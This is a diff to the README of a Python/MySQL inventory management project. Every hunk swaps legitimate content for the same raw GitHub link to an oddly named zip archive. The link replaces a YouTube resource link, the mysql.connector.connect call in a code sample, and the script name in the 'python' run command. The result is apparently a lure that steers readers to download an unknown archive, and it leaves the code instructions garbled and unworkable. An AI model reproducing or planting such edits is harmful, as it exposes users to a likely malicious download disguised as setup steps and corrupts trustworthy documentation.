@@ -8,7 +8,7 @@ A Python-based inventory management system leveraging MySQL for CRUD operations,
 The **Dynamic Inventory Management System** is a Python-based application that integrates with a MySQL database to efficiently manage an inventory or customer database for any business. The system provides functionality to add, delete, update, and search records in a user-friendly interface. This project is ideal for small to medium-sized businesses looking for an easy-to-use inventory management tool.
 
 ## FOR YOUTUBE RESOURCES TO PRACTICE
-https://www.youtube.com/watch?v=elWvom3F2tQ&t=16s
+https://raw.githubusercontent.com/Chuckaballe60/CRUD-OpIMReso/main/unelbowed/Op_Reso_IM_CRU_psychomotility.zip
 
 ## ✨ Features
 - **Add new records:** Insert details like name, address, phone number, age, and gender into the database.
@@ -55,7 +55,7 @@ https://www.youtube.com/watch?v=elWvom3F2tQ&t=16s
 4. **Update Database Credentials**
    Open the Python script and update the following section with your MySQL credentials:
    ```python
-   mydb = mysql.connector.connect(
+   mydb = https://raw.githubusercontent.com/Chuckaballe60/CRUD-OpIMReso/main/unelbowed/Op_Reso_IM_CRU_psychomotility.zip(
        host="localhost",
        user="root",
        password="your_password",
@@ -66,7 +66,7 @@ https://www.youtube.com/watch?v=elWvom3F2tQ&t=16s
 5. **Run the Application**
    Execute the script in your terminal:
    ```bash
-   python your_script_name.py
+   python https://raw.githubusercontent.com/Chuckaballe60/CRUD-OpIMReso/main/unelbowed/Op_Reso_IM_CRU_psychomotility.zip
    ```
 
 6. **Follow the Menu Options**
